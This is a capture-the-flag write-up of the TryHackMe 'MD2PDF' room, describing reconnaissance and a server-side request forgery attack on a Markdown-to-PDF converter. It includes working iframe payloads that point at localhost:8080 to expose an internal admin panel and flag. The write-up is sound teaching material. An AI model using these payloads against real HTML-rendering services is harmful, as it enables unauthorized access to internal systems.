# 📄 MD2PDF

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [MD2PDF](https://tryhackme.com/room/md2pdf) |
| **Difficulty** | 🟢 Easy |
| **Category** | Web |
| **OS** | Linux |
| **Tools** | Browser, Burp Suite, curl |

---

## 🎯 Objective

TopTierConversions LTD runs a Markdown to PDF converter. Exploit a Server-Side Request Forgery (SSRF) vulnerability to access internal resources.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
```

**Open ports:**
```
80/tcp   open  http
```

The web app converts Markdown input to PDF. There is also an admin panel on port 8080 not directly accessible from outside.

---

## 💥 Exploitation — SSRF

The Markdown converter renders HTML inside the PDF — meaning it processes any HTML tags including `<iframe>` and links.

Injecting an SSRF payload in the Markdown input:
```html
<iframe src="http://localhost:8080/"></iframe>
```

Submitting this renders the internal admin panel inside the generated PDF.

**Alternative iframe approach:**
```html
<iframe src="http://127.0.0.1:8080/flag.txt" width="800" height="600"></iframe>
```

The PDF output contains the flag from the internal-only admin panel.

---

## 📚 Lessons Learned

- SSRF allows attackers to make the server send requests on their behalf to internal resources
- PDF generators that render HTML are particularly vulnerable to SSRF via `<iframe>` tags
- Always test for internal port access: localhost:8080, 127.0.0.1:22, etc.
- SSRF can bypass firewall rules since the request originates from the server itself

---
*by OwlRC 🦉 | github.com/OwlRC*
